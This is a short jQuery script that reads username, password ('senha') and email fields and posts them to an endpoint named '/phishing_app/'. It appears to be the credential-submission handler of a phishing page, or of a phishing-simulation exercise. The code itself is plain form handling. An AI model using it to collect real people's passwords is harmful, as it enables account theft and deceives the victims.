$(document).on('click', 'button', function(){
	let usuario = $('#usuario').val();
	let senha = $('#senha').val();
	let email = $('#email').val();
	console.log(email)
	let let_name_btn = $(this).attr('name');

	if (let_name_btn == "envia_senha") {
        $.ajax({
            type:"POST",
            url: '/phishing_app/',
            dataType: 'json',
            data: {
                'usuario' : usuario,
                'senha'   :   senha,
                'email'   : email
            },
            success: function (data) {
                $("#envia_senha").attr("disabled", true);
            },
            error: function (request, status, error) {

            }
        });
	}
});